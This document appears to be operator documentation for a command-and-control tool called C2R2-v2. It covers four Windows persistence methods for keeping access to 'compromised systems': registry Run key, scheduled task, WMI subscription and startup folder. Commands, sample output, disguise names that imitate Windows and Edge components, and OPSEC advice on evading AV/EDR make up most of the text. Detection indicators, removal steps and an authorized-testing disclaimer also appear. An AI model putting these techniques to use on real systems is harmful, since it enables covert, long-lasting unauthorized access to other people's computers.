# Persistence Mechanisms

This document describes the persistence mechanisms available in C2R2-v2 for maintaining access to compromised systems.

## Overview

C2R2-v2 supports four persistence methods:

| Method | Command | Privilege | Stealth | Reliability |
|--------|---------|-----------|---------|-------------|
| Registry | `/persist registry` | User | Low | High |
| Scheduled Task | `/persist task` | User/Admin | Medium | High |
| WMI Event | `/persist wmi` | Admin | High | Medium |
| Startup Folder | `/persist startup` | User | Low | High |

---

## Usage

### Establish Persistence

```bash
# Select target agent
C2R2> /select 1

# Choose persistence method
C2R2 [1]> /persist registry
C2R2 [1]> /persist task
C2R2 [1]> /persist wmi
C2R2 [1]> /persist startup
```

### Remove All Persistence

```bash
C2R2 [1]> /persist_remove
```

This removes ALL persistence mechanisms established by the agent.

---

## Persistence Methods

### 1. Registry Run Key (`/persist registry`)

**How it works:**
- Copies agent to `%LOCALAPPDATA%\Microsoft\Windows\Runtime\RuntimeBroker.exe`
- Adds entry to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Agent starts automatically on user login

**Details:**
```
Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Name: RuntimeBroker (disguised as system process)
Value: %LOCALAPPDATA%\Microsoft\Windows\Runtime\RuntimeBroker.exe
```

**Privileges Required:** User  
**Trigger:** User login  
**Stealth Level:** Low (easily detected by AV/EDR)

**Example Output:**
```
[*] Establishing persistence via registry...
[+] Persistence established successfully
[+] Method: Registry Run Key
[+] Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[+] Name: RuntimeBroker
```

---

### 2. Scheduled Task (`/persist task`)

**How it works:**
- Copies agent to `%LOCALAPPDATA%\Microsoft\Windows\Runtime\RuntimeBroker.exe`
- Creates scheduled task that triggers on user logon
- Task runs the agent with normal priority

**Details:**
```
Task Name: MicrosoftEdgeUpdateTask (disguised as Edge update)
Trigger: User logon
Action: Execute agent executable
```

**Privileges Required:** User (admin for SYSTEM-level persistence)  
**Trigger:** User login  
**Stealth Level:** Medium

**Example Output:**
```
[*] Establishing persistence via scheduled task...
[+] Persistence established successfully
[+] Method: Scheduled Task
[+] Task Name: MicrosoftEdgeUpdateTask
[+] Trigger: User Logon
```

---

### 3. WMI Event Subscription (`/persist wmi`)

**How it works:**
- Creates WMI event filter for user logon
- Creates WMI event consumer to execute agent
- Binds filter to consumer

**Details:**
```
Filter: __EventFilter (Win32_LogonSession creation)
Consumer: CommandLineEventConsumer
Binding: __FilterToConsumerBinding
```

**Privileges Required:** Administrator  
**Trigger:** User logon (via WMI event)  
**Stealth Level:** High (rarely monitored)

**Example Output:**
```
[*] Establishing persistence via WMI...
[+] Persistence established successfully
[+] Method: WMI Event Subscription
[+] Filter: UserLogonFilter
[+] Consumer: RunRuntimeBroker
```

**Note:** This is the most stealthy option but requires admin privileges.

---

### 4. Startup Folder (`/persist startup`)

**How it works:**
- Copies agent to `%LOCALAPPDATA%\Microsoft\Windows\Runtime\RuntimeBroker.exe`
- Creates shortcut (`.lnk`) in user's Startup folder
- Agent starts when user logs in

**Details:**
```
Location: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
Shortcut: RuntimeBroker.lnk
Target: %LOCALAPPDATA%\Microsoft\Windows\Runtime\RuntimeBroker.exe
```

**Privileges Required:** User  
**Trigger:** User login  
**Stealth Level:** Low (visible in Startup folder)

**Example Output:**
```
[*] Establishing persistence via startup folder...
[+] Persistence established successfully
[+] Method: Startup Folder
[+] Location: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
[+] Shortcut: RuntimeBroker.lnk
```

---

## Agent Copy Location

All persistence methods copy the agent to:
```
%LOCALAPPDATA%\Microsoft\Windows\Runtime\RuntimeBroker.exe
```

This location:
- Is writable by standard users
- Uses a legitimate-looking path
- Is named after a real Windows process
- Survives reboots

---

## Removal

The `/persist_remove` command removes:

1. **Registry Key**: Deletes `RuntimeBroker` from Run key
2. **Scheduled Task**: Removes `MicrosoftEdgeUpdateTask`
3. **WMI Subscription**: Removes filter, consumer, and binding
4. **Startup Shortcut**: Deletes `RuntimeBroker.lnk`
5. **Agent Copy**: Deletes copied executable

**Example:**
```bash
C2R2 [1]> /persist_remove
[*] Removing persistence...
[+] Persistence removed successfully
[+] Removed: Registry Run Key
[+] Removed: Scheduled Task
[+] Removed: WMI Subscription
[+] Removed: Startup Shortcut
[+] Removed: Agent executable
```

---

## Verification

After establishing persistence, verify it was successful:

### Registry
```bash
C2R2 [1]> /cmd reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RuntimeBroker
```

### Scheduled Task
```bash
C2R2 [1]> /cmd schtasks /query /tn MicrosoftEdgeUpdateTask
```

### WMI
```bash
C2R2 [1]> /cmd wmic /namespace:\\root\subscription path __EventFilter get Name
```

### Startup Folder
```bash
C2R2 [1]> /cmd dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

---

## Troubleshooting

### "Permission denied" errors

- Registry, Task, and Startup work with user privileges
- WMI requires Administrator - ensure agent is elevated with `/elevate` first

### Persistence doesn't survive reboot

1. Verify the agent was copied:
   ```bash
   /cmd dir "%LOCALAPPDATA%\Microsoft\Windows\Runtime"
   ```

2. Check persistence mechanism is registered:
   - See verification commands above

3. Check for AV interference:
   - Some AV products block Run key modifications
   - Try alternate methods (WMI if admin, Task otherwise)

### Agent starts but doesn't connect after reboot

- Verify the server is running and accessible
- Check that the agent's configured server address is correct
- Network may not be available immediately at boot - agent will retry with backoff

---

## OPSEC Considerations

### Detection Indicators

| Method | Detection Vector |
|--------|-----------------|
| Registry | Autoruns, Sysmon Event 13 |
| Task | Task Scheduler, Sysmon Event 1 |
| WMI | WMI queries, Get-WMIObject |
| Startup | Explorer, file listing |

### Recommendations

1. **Use WMI when possible** - Most stealthy, requires admin
2. **Avoid Registry** in monitored environments - easily detected
3. **Scheduled Tasks** are a good middle ground
4. **Test persistence** before relying on it
5. **Remove persistence** during cleanup phase of engagement

### Detection Avoidance

- All methods use legitimate-looking names (`RuntimeBroker`, `MicrosoftEdgeUpdateTask`)
- Agent is copied to a path that looks like a Windows system folder
- Consider changing the process name for high-security environments

---

## Technical Implementation

### File: `agent/src/persistence.rs`

```rust
// Establish persistence using specified method
pub fn establish_persistence(method: &str) -> Result<String, String>

// Methods available:
// - "registry" -> add_registry_persistence()
// - "task" -> add_scheduled_task_persistence()
// - "wmi" -> add_wmi_persistence()
// - "startup" -> add_startup_folder_persistence()

// Remove all persistence
pub fn remove_persistence() -> Result<String, String>
```

---

**⚠️ For authorized security testing purposes only.**
